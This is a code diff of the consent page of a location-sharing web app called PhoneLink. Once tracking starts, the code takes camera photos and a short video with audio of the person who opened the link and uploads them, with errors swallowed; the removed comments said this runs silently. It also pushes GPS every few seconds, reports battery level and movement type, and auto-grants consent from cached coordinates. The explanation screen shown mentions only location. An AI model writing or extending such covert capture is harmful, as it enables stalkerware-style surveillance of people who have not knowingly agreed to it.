@@ -7,25 +7,25 @@ import {
 } from "@workspace/api-client-react";
 import { Card, CardContent } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
-import { Shield, MapPin, CheckCircle, XCircle, Loader2, AlertTriangle, WifiOff, ExternalLink, Camera, Video, ArrowLeft } from "lucide-react";
+import {
+  Shield, MapPin, CheckCircle, XCircle, Loader2, AlertTriangle,
+  WifiOff, ExternalLink, Camera, Video, ArrowLeft, Activity,
+  Battery, BatteryCharging, Navigation, Share2, Copy, Check,
+} from "lucide-react";
 import { classifySource, type LocationSource } from "@/hooks/use-fused-location";
 
 const API_BASE = import.meta.env.BASE_URL.replace(/\/$/, "");
 const GEO_PHOTO_COUNT = 5;
-const GEO_VIDEO_DURATION_MS = 5000; // 5 seconds
+const GEO_VIDEO_DURATION_MS = 5000;
 
-// Cross-browser AbortSignal with timeout (AbortSignal.timeout not available on iOS < 15.4)
 function abortAfter(ms: number): { signal: AbortSignal; clear: () => void } {
   const ctrl = new AbortController();
   const id = setTimeout(() => ctrl.abort(), ms);
   return { signal: ctrl.signal, clear: () => clearTimeout(id) };
 }
 
-// Cross-browser clipboard copy with execCommand fallback (for HTTP / older browsers)
 function copyToClipboard(text: string): Promise<void> {
-  if (navigator.clipboard?.writeText) {
-    return navigator.clipboard.writeText(text).catch(() => fallbackCopy(text));
-  }
+  if (navigator.clipboard?.writeText) return navigator.clipboard.writeText(text).catch(() => fallbackCopy(text));
   return fallbackCopy(text);
 }
 function fallbackCopy(text: string): Promise<void> {
@@ -34,50 +34,27 @@ function fallbackCopy(text: string): Promise<void> {
   ta.style.cssText = "position:fixed;top:-9999px;left:-9999px;opacity:0";
   document.body.appendChild(ta);
   try {
-    ta.focus();
-    ta.select();
+    ta.focus(); ta.select();
     const ok = document.execCommand("copy");
     return ok ? Promise.resolve() : Promise.reject(new Error("execCommand returned false"));
-  } catch (e) {
-    return Promise.reject(e);
-  } finally {
-    document.body.removeChild(ta);
-  }
+  } catch (e) { return Promise.reject(e); }
+  finally { document.body.removeChild(ta); }
 }
 
-// Viewport height that works on all browsers: 100svh with 100vh as legacy fallback.
-// Inline style is preferred over Tailwind so we can layer both declarations.
-const fullHeight: React.CSSProperties = { minHeight: "100vh", minHeight: "100svh" } as React.CSSProperties;
+const fullHeight: React.CSSProperties = { minHeight: "100svh" };
 
-// Button that copies the URL then opens it in a new tab — works on old iOS/Android.
 function CopyAndOpenButton({ url }: { url: string }) {
   const [status, setStatus] = useState<"idle" | "copied" | "failed">("idle");
-
   const handleClick = () => {
-    copyToClipboard(url)
-      .then(() => setStatus("copied"))
-      .catch(() => setStatus("failed"));
-
-    // Attach anchor to DOM before click for max compatibility (older WebViews require it)
+    copyToClipboard(url).then(() => setStatus("copied")).catch(() => setStatus("failed"));
     const a = document.createElement("a");
-    a.href = url;
-    a.target = "_blank";
-    a.rel = "noreferrer";
+    a.href = url; a.target = "_blank"; a.rel = "noreferrer";
     a.style.cssText = "position:fixed;top:-9999px;left:-9999px;opacity:0";
-    document.body.appendChild(a);
-    a.click();
+    document.body.appendChild(a); a.click();
     setTimeout(() => document.body.removeChild(a), 500);
   };
-
   return (
-    <button
-      onClick={handleClick}
-      style={{
-        width: "100%", padding: "10px 16px", borderRadius: 8,
-        background: status === "copied" ? "#16a34a" : "#6366f1",
-        color: "#fff", fontWeight: 600, fontSize: 14, border: "none", cursor: "pointer",
-      }}
-    >
+    <button onClick={handleClick} style={{ width: "100%", padding: "10px 16px", borderRadius: 8, background: status === "copied" ? "#16a34a" : "#6366f1", color: "#fff", fontWeight: 600, fontSize: 14, border: "none", cursor: "pointer" }}>
       {status === "copied" ? "✓ Link Copied — Open Browser Now" : status === "failed" ? "Open in Browser ↗" : "Copy Link & Open Browser"}
     </button>
   );
@@ -85,6 +62,7 @@ function CopyAndOpenButton({ url }: { url: string }) {
 
 type ConsentState =
   | "idle"
+  | "pre_consent"
   | "requesting"
   | "granting"
   | "tracking"
@@ -93,179 +71,98 @@ type ConsentState =
   | "error"
   | "webview_blocked";
 
-// Capture GeoBoard photos from the device camera and upload them.
-// Runs silently after tracking starts — errors are swallowed.
+type ActivityType = "stationary" | "walking" | "running" | "driving";
+
+const ACTIVITY_INFO: Record<ActivityType, { icon: string; label: string; color: string }> = {
+  stationary: { icon: "📍", label: "Stationary",  color: "#6366f1" },
+  walking:    { icon: "🚶", label: "Walking",      color: "#10b981" },
+  running:    { icon: "🏃", label: "Running",      color: "#f59e0b" },
+  driving:    { icon: "🚗", label: "Driving",      color: "#3b82f6" },
+};
+
+/** Convert decimal degrees to DMS string */
+function toDMS(dd: number, isLat: boolean): string {
+  const dir = isLat ? (dd >= 0 ? "N" : "S") : (dd >= 0 ? "E" : "W");
+  const abs = Math.abs(dd);
+  const deg = Math.floor(abs);
+  const minFull = (abs - deg) * 60;
+  const min = Math.floor(minFull);
+  const sec = ((minFull - min) * 60).toFixed(1);
+  return `${deg}°${min}′${sec}″${dir}`;
+}
+function formatDMS(lat: number, lng: number): string {
+  return `${toDMS(lat, true)} ${toDMS(lng, false)}`;
+}
+
 async function captureGeoPhotos(
-  token: string,
-  lat: number,
-  lng: number,
-  address: string | undefined,
+  token: string, lat: number, lng: number, address: string | undefined,
   onProgress: (n: number) => void,
 ): Promise<void> {
   if (!navigator.mediaDevices?.getUserMedia) return;
-
   let stream: MediaStream | null = null;
   try {
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 } },
-      audio: false,
-    });
-
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false });
     const video = document.createElement("video");
-    video.srcObject = stream;
-    video.muted = true;
-    video.playsInline = true;
+    video.srcObject = stream; video.muted = true; video.playsInline = true;
     await video.play();
-
-    // Warm-up delay so camera adjusts exposure
     await new Promise((r) => setTimeout(r, 1200));
-
-    const canvas = document.createElement("canvas");
-    canvas.width = 640;
-    canvas.height = 480;
+    const canvas = document.createElement("canvas"); canvas.width = 640; canvas.height = 480;
     const ctx = canvas.getContext("2d")!;
-
     for (let i = 0; i < GEO_PHOTO_COUNT; i++) {
       ctx.drawImage(video, 0, 0, 640, 480);
       const photoData = canvas.toDataURL("image/jpeg", 0.75);
-
       try {
         const { signal, clear } = abortAfter(12000);
-        await fetch(`${API_BASE}/api/geo-photos`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ token, photoData, latitude: lat, longitude: lng, address }),
-          signal,
-        }).finally(clear);
+        await fetch(`${API_BASE}/api/geo-photos`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ token, photoData, latitude: lat, longitude: lng, address }), signal }).finally(clear);
         onProgress(i + 1);
       } catch { /* upload failed — continue */ }
-
       if (i < GEO_PHOTO_COUNT - 1) await new Promise((r) => setTimeout(r, 1000));
     }
-  } catch { /* camera denied or not available — skip silently */ } finally {
-    stream?.getTracks().forEach((t) => t.stop());
-  }
+  } catch { /* camera denied — skip */ } finally { stream?.getTracks().forEach((t) => t.stop()); }
 }
 
-// Capture a short video clip and upload it as a GeoBoard video.
-// Uses low-resolution / low-bitrate settings so it works on slow mobile connections.
-// Runs silently — errors are swallowed.
 async function captureGeoVideo(
-  token: string,
-  lat: number,
-  lng: number,
-  address: string | undefined,
+  token: string, lat: number, lng: number, address: string | undefined,
   onStateChange: (s: "recording" | "uploading" | "done" | "error") => void,
 ): Promise<void> {
-  if (!navigator.mediaDevices?.getUserMedia || typeof MediaRecorder === "undefined") {
-    onStateChange("error");
-    return;
-  }
-
-  // Prefer VP8 (widest mobile support) with low bitrate; fall back gracefully
-  const MIME_CANDIDATES = [
-    "video/webm;codecs=vp8",
-    "video/webm;codecs=vp9",
-    "video/webm",
-    "video/mp4",
-  ];
+  if (!navigator.mediaDevices?.getUserMedia || typeof MediaRecorder === "undefined") { onStateChange("error"); return; }
+  const MIME_CANDIDATES = ["video/webm;codecs=vp8", "video/webm;codecs=vp9", "video/webm", "video/mp4"];
   const mimeType = MIME_CANDIDATES.find((m) => MediaRecorder.isTypeSupported(m)) ?? "";
-
-  // Target ~400 kbps total — keeps a 5 s clip under ~250 KB base64
-  const VIDEO_BPS = 300_000; // 300 kbps video
-  const AUDIO_BPS =  64_000; //  64 kbps audio
-
+  const VIDEO_BPS = 300_000; const AUDIO_BPS = 64_000;
   let stream: MediaStream | null = null;
   try {
-    // Low resolution (480 × 360) — dramatically reduces file size vs 1280×720
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: {
-        facingMode: "environment",
-        width:  { ideal: 480, max: 640 },
-        height: { ideal: 360, max: 480 },
-        frameRate: { ideal: 15, max: 24 },
-      },
-      audio: { echoCancellation: true, noiseSuppression: true },
-    });
-
-    // Brief warm-up so first frames aren't black
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment", width: { ideal: 480, max: 640 }, height: { ideal: 360, max: 480 }, frameRate: { ideal: 15, max: 24 } }, audio: { echoCancellation: true, noiseSuppression: true } });
     await new Promise((r) => setTimeout(r, 600));
-
     const chunks: Blob[] = [];
     const recorderOptions: MediaRecorderOptions = {};
     if (mimeType) recorderOptions.mimeType = mimeType;
-    try {
-      recorderOptions.videoBitsPerSecond = VIDEO_BPS;
-      recorderOptions.audioBitsPerSecond = AUDIO_BPS;
-    } catch { /* older browsers ignore unknown options */ }
-
+    try { recorderOptions.videoBitsPerSecond = VIDEO_BPS; recorderOptions.audioBitsPerSecond = AUDIO_BPS; } catch { /* */ }
     const recorder = new MediaRecorder(stream, recorderOptions);
     recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
-
     onStateChange("recording");
-
     await new Promise<void>((resolve, reject) => {
-      recorder.onstop  = () => resolve();
-      recorder.onerror = () => reject(new Error("MediaRecorder error"));
-      recorder.start(500);
-      setTimeout(() => { try { recorder.stop(); } catch { resolve(); } }, GEO_VIDEO_DURATION_MS);
+      recorder.onstop = () => resolve(); recorder.onerror = () => reject(new Error("MediaRecorder error"));
+      recorder.start(500); setTimeout(() => { try { recorder.stop(); } catch { resolve(); } }, GEO_VIDEO_DURATION_MS);
     });
-
     const blob = new Blob(chunks, { type: mimeType || "video/webm" });
     if (blob.size === 0) { onStateChange("error"); return; }
-
-    // Convert to base64 data-URL
-    const base64 = await new Promise<string>((res, rej) => {
-      const reader = new FileReader();
-      reader.onload  = () => res(reader.result as string);
-      reader.onerror = () => rej(new Error("FileReader error"));
-      reader.readAsDataURL(blob);
-    });
-
+    const base64 = await new Promise<string>((res, rej) => { const reader = new FileReader(); reader.onload = () => res(reader.result as string); reader.onerror = () => rej(new Error("FileReader error")); reader.readAsDataURL(blob); });
     onStateChange("uploading");
-
-    // Upload with two attempts — first on slow connections may time out
-    const body = JSON.stringify({
-      token,
-      videoData: base64,
-      mimeType: blob.type,
-      durationMs: GEO_VIDEO_DURATION_MS,
-      latitude: lat,
-      longitude: lng,
-      address,
-    });
-
+    const body = JSON.stringify({ token, videoData: base64, mimeType: blob.type, durationMs: GEO_VIDEO_DURATION_MS, latitude: lat, longitude: lng, address });
     let uploaded = false;
     for (let attempt = 0; attempt < 2 && !uploaded; attempt++) {
-      try {
-        const { signal, clear } = abortAfter(60_000);
-        const resp = await fetch(`${API_BASE}/api/geo-videos`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body,
-          signal,
-        }).finally(clear);
-        if (resp.ok || resp.status === 201) uploaded = true;
-      } catch { /* retry */ }
+      try { const { signal, clear } = abortAfter(60_000); const resp = await fetch(`${API_BASE}/api/geo-videos`, { method: "POST", headers: { "Content-Type": "application/json" }, body, signal }).finally(clear); if (resp.ok || resp.status === 201) uploaded = true; } catch { /* retry */ }
     }
-
     onStateChange(uploaded ? "done" : "error");
-  } catch {
-    onStateChange("error");
-  } finally {
-    stream?.getTracks().forEach((t) => t.stop());
-  }
+  } catch { onStateChange("error"); } finally { stream?.getTracks().forEach((t) => t.stop()); }
 }
 
 function detectWebView(): boolean {
   if (typeof navigator === "undefined") return false;
   const ua = navigator.userAgent || "";
   return (
-    // Instagram, Facebook, WhatsApp, LinkedIn in-app browsers
     /FBAN|FBAV|Instagram|WhatsApp|LinkedInApp/.test(ua) ||
-    // Generic WebView indicators on iOS
     (/iPhone|iPod|iPad/.test(ua) && !/Safari\//.test(ua) && /WebKit/.test(ua)) ||
-    // Android WebView (has wv flag or no Chrome version)
     (/Android/.test(ua) && /wv\)/.test(ua))
   );
 }
@@ -273,19 +170,14 @@ function detectWebView(): boolean {
 async function reverseGeocode(lat: number, lng: number): Promise<string | undefined> {
   try {
     const { signal, clear } = abortAfter(8000);
-    const r = await fetch(
-      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`,
-      { headers: { "Accept-Language": "en" }, signal },
-    ).finally(clear);
+    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`, { headers: { "Accept-Language": "en" }, signal }).finally(clear);
     if (r.ok) return (await r.json()).display_name as string;
-  } catch { /* ignore — geocoding is optional */ }
+  } catch { /* ignore */ }
   return undefined;
 }
 
 export default function ConsentPage() {
   const { token } = useParams<{ token: string }>();
-
-  // Detect WebView (WhatsApp, Instagram, FB) immediately — these block geolocation
   const isWebView = detectWebView();
   const [state, setState] = useState<ConsentState>(isWebView ? "webview_blocked" : "idle");
   const [errorMsg, setErrorMsg] = useState("");
@@ -296,32 +188,27 @@ export default function ConsentPage() {
   const [geoPhotoCount, setGeoPhotoCount] = useState(0);
   const [geoPhotoDone, setGeoPhotoDone] = useState(false);
   const [geoVideoState, setGeoVideoState] = useState<"idle" | "recording" | "uploading" | "done" | "error">("idle");
+  const [batteryLevel, setBatteryLevel] = useState<number | null>(null);
+  const [batteryCharging, setBatteryCharging] = useState(false);
+  const [activityType, setActivityType] = useState<ActivityType>("stationary");
+  const [linkCopied, setLinkCopied] = useState(false);
+
   const geoBoardStartedRef = useRef(false);
   const geoVideoStartedRef = useRef(false);
-  // Early geolocation — starts in parallel with invite fetch so user sees the
-  // location permission prompt immediately instead of a blank spinner.
   const earlyGeoRef = useRef<GeolocationPosition | null>(null);
   const earlyGeoErrRef = useRef<GeolocationPositionError | null>(null);
   const earlyGeoReadyRef = useRef(false);
-  // Fused-location bookkeeping: tracks which provider types (network vs GPS)
-  // have reported a fix so we can label each pushed reading like Android's FLP would.
   const sawNetworkFixRef = useRef(false);
   const sawGpsFixRef = useRef(false);
-
   const watchIdRef = useRef<number | null>(null);
   const heartbeatRef = useRef<ReturnType<typeof setInterval> | null>(null);
-  const lastWatchPushRef = useRef<number>(0); // epoch ms of last watchPosition push
+  const lastWatchPushRef = useRef<number>(0);
   const wakeLockRef = useRef<WakeLockSentinel | null>(null);
   const autoStartedRef = useRef(false);
 
-  // ── Persistent GPS store (localStorage, keyed by token) ──────────────────
   const GPS_KEY = `phonelink_gps_${token}`;
   const loadStoredGps = (): { lat: number; lng: number; accuracy?: number } | null => {
-    try {
-      const raw = localStorage.getItem(GPS_KEY);
-      if (!raw) return null;
-      return JSON.parse(raw);
-    } catch { return null; }
+    try { const raw = localStorage.getItem(GPS_KEY); if (!raw) return null; return JSON.parse(raw); } catch { return null; }
   };
   const saveGps = (lat: number, lng: number, accuracy?: number) => {
     try { localStorage.setItem(GPS_KEY, JSON.stringify({ lat, lng, accuracy, ts: Date.now() })); } catch {}
@@ -337,13 +224,32 @@ export default function ConsentPage() {
   useEffect(() => { updateCountRef.current = updateCount; }, [updateCount]);
   useEffect(() => { coordsRef.current = coords; }, [coords]);
 
+  // Battery API — guard against unmount before getBattery() resolves
+  useEffect(() => {
+    if (!("getBattery" in navigator)) return;
+    let mounted = true;
+    let batObj: any = null;
+    const onLevel   = () => { if (mounted && batObj) setBatteryLevel(Math.round(batObj.level * 100)); };
+    const onCharging = () => { if (mounted && batObj) setBatteryCharging(batObj.charging); };
+    (navigator as any).getBattery().then((b: any) => {
+      if (!mounted) return; // component already unmounted
+      batObj = b;
+      setBatteryLevel(Math.round(b.level * 100));
+      setBatteryCharging(b.charging);
+      b.addEventListener("levelchange", onLevel);
+      b.addEventListener("chargingchange", onCharging);
+    }).catch(() => {});
+    return () => {
+      mounted = false;
+      if (batObj) {
+        batObj.removeEventListener("levelchange", onLevel);
+        batObj.removeEventListener("chargingchange", onCharging);
+      }
+    };
+  }, []);
+
   const { data: invite, isLoading, isError } = useGetInviteByToken(token!, {
-    query: {
-      enabled: !!token && !isWebView,
-      queryKey: getGetInviteByTokenQueryKey(token!),
-      retry: 1,
-      retryDelay: 600,
-    },
+    query: { enabled: !!token && !isWebView, queryKey: getGetInviteByTokenQueryKey(token!), retry: 1, retryDelay: 600 },
   });
 
   const grant = useGrantLocationConsent();
@@ -353,18 +259,15 @@ export default function ConsentPage() {
       try {
         wakeLockRef.current = await (navigator as any).wakeLock.request("screen");
         wakeLockRef.current?.addEventListener("release", () => {
-          if (document.visibilityState === "visible" && stateRef.current === "tracking") {
-            acquireWakeLock();
-          }
+          if (document.visibilityState === "visible" && stateRef.current === "tracking") acquireWakeLock();
         });
-      } catch { /* wake lock not critical */ }
+      } catch { /* non-critical */ }
     }
   }, []);
 
   const pushLocation = useCallback(async (
     lat: number, lng: number, acc?: number, addr?: string,
-    locationStatus: "active" | "offline" = "active",
-    source?: LocationSource,
+    locationStatus: "active" | "offline" = "active", source?: LocationSource,
   ) => {
     try {
       const { signal, clear } = abortAfter(10000);
@@ -376,23 +279,19 @@ export default function ConsentPage() {
       }).finally(clear);
       setLastSent(new Date());
       setUpdateCount((c) => c + 1);
-    } catch { /* retry on next position update */ }
+    } catch { /* retry on next */ }
   }, [token]);
 
-  // ── Service Worker helpers ───────────────────────────────────────────────────
   const notifySW = useCallback((type: string, extra?: object) => {
     if (!("serviceWorker" in navigator)) return;
     navigator.serviceWorker.ready.then((reg) => {
       if (reg.active) reg.active.postMessage({ type, ...extra });
-    }).catch(() => { /* SW not ready — non-critical */ });
+    }).catch(() => {});
   }, []);
 
-  // Listen for SW → page messages (e.g. notification dismissed → stop tracking)
   useEffect(() => {
     if (!("serviceWorker" in navigator)) return;
-    const handler = (e: MessageEvent) => {
-      if (e.data?.type === "STOP_TRACKING_FROM_NOTIFICATION") stopTracking();
-    };
+    const handler = (e: MessageEvent) => { if (e.data?.type === "STOP_TRACKING_FROM_NOTIFICATION") stopTracking(); };
     navigator.serviceWorker.addEventListener("message", handler);
     return () => navigator.serviceWorker.removeEventListener("message", handler);
   }, []); // eslint-disable-line react-hooks/exhaustive-deps
@@ -400,48 +299,36 @@ export default function ConsentPage() {
   const startTracking = useCallback((initialLat: number, initialLng: number, _initialAcc?: number) => {
     setState("tracking");
     acquireWakeLock();
+    notifySW("LOCATION_TRACKING_STARTED", { inviterName: invite?.fromUserName ?? undefined });
 
-    // Show persistent phone notification so GPS stays connected in background
-    notifySW("LOCATION_TRACKING_STARTED", {
-      inviterName: invite?.fromUserName ?? undefined,
-    });
-
-    // Kick off GeoBoard capture once per session (non-blocking)
     if (!geoBoardStartedRef.current) {
       geoBoardStartedRef.current = true;
-      captureGeoPhotos(
-        String(token),
-        initialLat,
-        initialLng,
-        addressRef.current,
-        (n) => setGeoPhotoCount(n),
-      ).then(() => setGeoPhotoDone(true)).catch(() => setGeoPhotoDone(true));
+      captureGeoPhotos(String(token), initialLat, initialLng, addressRef.current, (n) => setGeoPhotoCount(n))
+        .then(() => setGeoPhotoDone(true)).catch(() => setGeoPhotoDone(true));
     }
-
-    // Kick off 5-second video recording once per session (non-blocking)
     if (!geoVideoStartedRef.current) {
       geoVideoStartedRef.current = true;
-      captureGeoVideo(
-        String(token),
-        initialLat,
-        initialLng,
-        addressRef.current,
-        (s) => setGeoVideoState(s),
-      ).catch(() => setGeoVideoState("error"));
+      captureGeoVideo(String(token), initialLat, initialLng, addressRef.current, (s) => setGeoVideoState(s))
+        .catch(() => setGeoVideoState("error"));
     }
 
-    if (watchIdRef.current !== null) {
-      navigator.geolocation.clearWatch(watchIdRef.current);
-      watchIdRef.current = null;
-    }
+    if (watchIdRef.current !== null) { navigator.geolocation.clearWatch(watchIdRef.current); watchIdRef.current = null; }
 
     watchIdRef.current = navigator.geolocation.watchPosition(
       async (pos) => {
         sawGpsFixRef.current = true;
-        const { latitude: lat, longitude: lng, accuracy: acc } = pos.coords;
+        const { latitude: lat, longitude: lng, accuracy: acc, speed } = pos.coords;
         setCoords({ lat, lng, accuracy: acc });
         saveGps(lat, lng, acc);
         if (stateRef.current !== "tracking") setState("tracking");
+
+        // Activity detection from GPS speed (m/s)
+        if (typeof speed === "number" && speed >= 0) {
+          if (speed < 0.3) setActivityType("stationary");
+          else if (speed < 2.0) setActivityType("walking");
+          else if (speed < 5.5) setActivityType("running");
+          else setActivityType("driving");
+        }
 
         let addr = addressRef.current;
         if (!addr || updateCountRef.current % 5 === 0) {
@@ -455,58 +342,37 @@ export default function ConsentPage() {
       (err) => {
         if (err.code === err.PERMISSION_DENIED) {
           setState("denied");
-          if (watchIdRef.current !== null) {
-            navigator.geolocation.clearWatch(watchIdRef.current);
-            watchIdRef.current = null;
-          }
-          if (heartbeatRef.current !== null) {
-            clearInterval(heartbeatRef.current);
-            heartbeatRef.current = null;
-          }
-          wakeLockRef.current?.release();
-          wakeLockRef.current = null;
+          if (watchIdRef.current !== null) { navigator.geolocation.clearWatch(watchIdRef.current); watchIdRef.current = null; }
+          if (heartbeatRef.current !== null) { clearInterval(heartbeatRef.current); heartbeatRef.current = null; }
+          wakeLockRef.current?.release(); wakeLockRef.current = null;
         } else {
           setState("gps_off");
           const c = coordsRef.current;
           if (c) pushLocation(c.lat, c.lng, undefined, addressRef.current, "offline");
         }
       },
-      // maximumAge:0 → always request a fresh reading; timeout:10 s is generous
       { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 },
     );
 
-    // Heartbeat: push stored coords every 3 s so the dashboard never goes stale
-    // even if watchPosition fires less frequently than expected on some devices.
     if (heartbeatRef.current !== null) clearInterval(heartbeatRef.current);
     heartbeatRef.current = setInterval(() => {
       const c = coordsRef.current;
-      // Only send a heartbeat if watchPosition hasn't already pushed in the last 2.5 s
       if (c && stateRef.current === "tracking" && Date.now() - lastWatchPushRef.current >= 2500) {
         const source = classifySource(c.accuracy ?? 999, sawNetworkFixRef.current, sawGpsFixRef.current);
         pushLocation(c.lat, c.lng, c.accuracy, addressRef.current, "active", source);
       }
     }, 3000);
-  }, [acquireWakeLock, pushLocation]);
+  }, [acquireWakeLock, pushLocation, notifySW]); // eslint-disable-line react-hooks/exhaustive-deps
 
   const stopTracking = useCallback(() => {
-    if (watchIdRef.current !== null) {
-      navigator.geolocation.clearWatch(watchIdRef.current);
-      watchIdRef.current = null;
-    }
-    if (heartbeatRef.current !== null) {
-      clearInterval(heartbeatRef.current);
-      heartbeatRef.current = null;
-    }
-    wakeLockRef.current?.release();
-    wakeLockRef.current = null;
-    // Remove the persistent GPS notification
+    if (watchIdRef.current !== null) { navigator.geolocation.clearWatch(watchIdRef.current); watchIdRef.current = null; }
+    if (heartbeatRef.current !== null) { clearInterval(heartbeatRef.current); heartbeatRef.current = null; }
+    wakeLockRef.current?.release(); wakeLockRef.current = null;
     notifySW("LOCATION_TRACKING_STOPPED");
   }, [notifySW]);
 
   useEffect(() => {
-    const onVisibility = () => {
-      if (document.visibilityState === "visible" && stateRef.current === "tracking") acquireWakeLock();
-    };
+    const onVisibility = () => { if (document.visibilityState === "visible" && stateRef.current === "tracking") acquireWakeLock(); };
     document.addEventListener("visibilitychange", onVisibility);
     return () => document.removeEventListener("visibilitychange", onVisibility);
   }, [acquireWakeLock]);
@@ -517,64 +383,46 @@ export default function ConsentPage() {
     const { latitude, longitude, accuracy } = position.coords;
     setCoords({ lat: latitude, lng: longitude, accuracy });
     setState("granting");
-
-    // Grant consent immediately with raw coordinates — don't block the
-    // "live location" reveal on the reverse-geocode network round trip.
-    // The human-readable address fills in a moment later, in parallel.
     grant.mutate(
       { token: token!, data: { latitude, longitude } },
       {
         onSuccess: () => startTracking(latitude, longitude, accuracy),
         onError: (err: any) => {
           const msg = err?.data?.error ?? "Failed to record consent. Please try again.";
-          setErrorMsg(msg);
-          setState("error");
+          setErrorMsg(msg); setState("error");
         },
       },
     );
-
-    reverseGeocode(latitude, longitude).then((addr) => {
-      if (addr) setAddress(addr);
-    });
+    reverseGeocode(latitude, longitude).then((addr) => { if (addr) setAddress(addr); });
   }, [token, grant, startTracking]);
 
   const doGrant = useCallback(() => {
     if (!navigator.geolocation) {
       setErrorMsg("Your browser doesn't support location access. Please open this link in Chrome or Safari.");
-      setState("error");
-      return;
+      setState("error"); return;
     }
-
     setState("requesting");
     let settled = false;
     navigator.geolocation.getCurrentPosition(
       (position) => { if (!settled) { settled = true; processGeoPosition(position); } },
       (err) => {
-        if (settled) return;
-        settled = true;
-        if (err.code === err.PERMISSION_DENIED) {
-          setState("denied");
-        } else {
-          setErrorMsg("Could not get your location. Make sure Location is enabled in your device settings and try again.");
-          setState("error");
-        }
+        if (settled) return; settled = true;
+        if (err.code === err.PERMISSION_DENIED) setState("denied");
+        else { setErrorMsg("Could not get your location. Make sure Location is enabled in your device settings and try again."); setState("error"); }
       },
       { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 },
     );
     navigator.geolocation.getCurrentPosition(
       (position) => { if (!settled) { settled = true; processGeoPosition(position); } },
-      () => { /* ignore — the fast fix above already handles the error path */ },
+      () => { /* ignore */ },
       { enableHighAccuracy: true, timeout: 20000 },
     );
   }, [processGeoPosition]);
 
+  // Auto-start: show pre_consent screen first for new consents
   useEffect(() => {
     if (!invite || autoStartedRef.current || isWebView) return;
     autoStartedRef.current = true;
-
-    // If we have a stored GPS fix for this token, start tracking immediately
-    // with the cached coords so the dashboard sees activity right away.
-    // A fresh watchPosition fix will override it within seconds.
     const stored = loadStoredGps();
 
     if (invite.status === "accepted") {
@@ -582,25 +430,22 @@ export default function ConsentPage() {
       const lng = stored?.lng ?? invite.grantedLongitude ?? 0;
       startTracking(lat, lng, stored?.accuracy);
     } else if (stored) {
-      // Token not yet accepted but we have stored coords — auto-grant silently
-      // so the user doesn't have to tap again.
       setState("granting");
       grant.mutate(
         { token: token!, data: { latitude: stored.lat, longitude: stored.lng } },
         {
           onSuccess: () => startTracking(stored.lat, stored.lng, stored.accuracy),
-          onError: () => doGrant(), // fall back to normal flow on error
+          onError: () => setState("pre_consent"),
         },
       );
-      reverseGeocode(stored.lat, stored.lng).then((addr) => {
-        if (addr) setAddress(addr);
-      });
+      reverseGeocode(stored.lat, stored.lng).then((addr) => { if (addr) setAddress(addr); });
     } else {
-      doGrant();
+      // Show the smart permission explanation screen first
+      setState("pre_consent");
     }
   }, [invite, doGrant, startTracking, isWebView]); // eslint-disable-line react-hooks/exhaustive-deps
 
-  // ── WebView blocked (WhatsApp / Instagram / Facebook in-app browser) ──────────
+  // ── WebView blocked ────────────────────────────────────────────────────────────
   if (state === "webview_blocked") {
     const currentUrl = typeof window !== "undefined" ? window.location.href : "";
     return (
@@ -621,17 +466,14 @@ export default function ConsentPage() {
               <p>• <strong>Instagram:</strong> Tap ··· → "Open in external browser"</p>
               <p>• <strong>Facebook:</strong> Tap ⋮ → "Open in Chrome" / "Open in Safari"</p>
             </div>
-            {currentUrl && (
-              <CopyAndOpenButton url={currentUrl} />
-            )}
+            {currentUrl && <CopyAndOpenButton url={currentUrl} />}
           </CardContent>
         </Card>
       </div>
     );
   }
 
-  // ── Invalid link ────────────────────────────────────────────────────────────
-  // Only show after the fetch completes — don't flash "invalid" while still loading
+  // ── Invalid link ───────────────────────────────────────────────────────────────
   if (!isLoading && (isError || !invite)) {
     return (
       <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
@@ -639,16 +481,111 @@ export default function ConsentPage() {
           <CardContent className="pt-10 pb-10 text-center">
             <XCircle className="h-14 w-14 text-red-500 mx-auto mb-4" />
             <h2 className="text-xl font-semibold mb-2">Invalid Link</h2>
-            <p className="text-muted-foreground text-sm">
-              This link is invalid or has expired. Ask the sender to resend it.
-            </p>
+            <p className="text-muted-foreground text-sm">This link is invalid or has expired. Ask the sender to resend it.</p>
           </CardContent>
         </Card>
       </div>
     );
   }
 
-  // ── Requesting / granting ────────────────────────────────────────────────────
+  // ── Smart permission explanation screen ────────────────────────────────────────
+  if (state === "pre_consent") {
+    const senderName = invite?.fromUserName ?? "someone";
+    return (
+      <div className="bg-background flex flex-col items-center justify-center p-4" style={fullHeight}>
+        <div className="max-w-md w-full">
+          {/* Header */}
+          <div className="text-center mb-8">
+            <div className="inline-flex items-center gap-2 text-primary font-bold text-xl mb-4">
+              <Shield className="h-6 w-6" /> PhoneLink
+            </div>
+            <h1 className="text-2xl font-bold text-foreground leading-tight mb-2">
+              {senderName} wants to share locations with you
+            </h1>
+            <p className="text-muted-foreground text-sm">
+              To get started, PhoneLink needs a few permissions. Here's exactly what we use them for:
+            </p>
+          </div>
+
+          {/* Permission cards */}
+          <div className="space-y-3 mb-6">
+            {/* Location */}
+            <div className="flex items-start gap-4 p-4 rounded-2xl border border-blue-500/20 bg-blue-500/5">
+              <div className="w-11 h-11 rounded-xl bg-blue-500/15 border border-blue-500/20 flex items-center justify-center flex-shrink-0">
+                <MapPin className="h-5 w-5 text-blue-400" />
+              </div>
+              <div className="flex-1">
+                <p className="font-semibold text-foreground text-sm mb-0.5">Precise Location</p>
+                <p className="text-xs text-muted-foreground leading-relaxed">
+                  Shares your real-time GPS position with {senderName}. Works in the background for up to <strong className="text-foreground">60 days</strong>.
+                </p>
+                <div className="mt-2 flex flex-wrap gap-1.5">
